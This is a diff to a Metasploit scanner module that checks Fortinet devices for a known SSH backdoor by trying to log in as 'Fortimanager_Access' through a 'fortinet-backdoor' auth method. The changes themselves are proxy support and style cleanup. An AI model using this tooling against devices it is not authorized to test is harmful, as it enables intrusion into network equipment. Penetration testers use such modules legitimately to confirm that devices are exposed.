@@ -8,6 +8,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Fortinet
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::SSH
 
   def initialize(info = {})
     super(update_info(info,
@@ -41,20 +42,19 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
+    factory = ssh_socket_factory
     ssh_opts = {
       port:         rport,
-      auth_methods: ['fortinet-backdoor']
+      auth_methods: ['fortinet-backdoor'],
+      proxy: factory,
+      :non_interactive => true
     }
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
     begin
       ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
-        Net::SSH.start(
-          ip,
-          'Fortimanager_Access',
-          ssh_opts
-        )
+        Net::SSH.start(ip, 'Fortimanager_Access', ssh_opts)
       end
     rescue Net::SSH::Exception => e
       vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
@@ -64,10 +64,10 @@ class MetasploitModule < Msf::Auxiliary
     if ssh
       print_good("#{ip}:#{rport} - Logged in as Fortimanager_Access")
       report_vuln(
-        :host => ip,
-        :name => self.name,
-        :refs => self.references,
-        :info => ssh.transport.server_version.version
+        host: ip,
+        name: self.name,
+        refs: self.references,
+        info: ssh.transport.server_version.version
       )
     end
   end
